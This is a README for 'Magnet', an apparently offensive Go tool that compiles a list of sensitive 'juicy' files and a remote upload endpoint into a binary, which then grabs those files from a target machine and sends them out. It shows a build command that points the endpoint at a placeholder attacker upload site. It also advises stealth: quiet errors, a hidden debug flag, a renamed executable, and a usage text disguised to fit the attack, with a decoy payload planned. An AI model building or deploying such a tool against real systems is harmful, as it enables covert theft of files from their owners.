# Magnet

<div align=center>
  <pre>🧲⚡
  <strong>Grab interesting files from remote</strong><br>
  All the jobs is done at compilation time</pre>
</div>



## Usage

**At compilation time** you need to specify:
* ***The remote endpoint***, where your will upload juicy files
* ***The Juicy files***, list of files you want to grab. (File are separated by a comma `,`)
* ***The target os***, to to fit the target (between: `windows`, `darwin`, `linux`

So the compilation line looks like this:
```shell
export FILES=$(cat samples/linux_juicy_files.txt)
export ENDPOINT=http://[ATTACKER_UPLOAD_SITE]
GOOS=linux GOARCH=amd64 go build -ldflags "-X main.FileList=$FILES -X main.Endpoint=$ENDPOINT" magnet.go
```

Then on target machine:

### Notes

* For the remote endpoint , I suggest you to use the `/push` endpoint of a [`gitar`](https://github.com/ariary/gitar) listener
* The software is built to be stealthy hence:
  * error handling is not verbose (hidden flag to get more verbosity `-thisisdebug`)
  * I suggest to overwrite usage string in `magnet.go` to fit your attack scenario
  * rename `magnet` executable

## To do

Include a fake payload that will also be run to fake an attacking scenario (example update, etc)
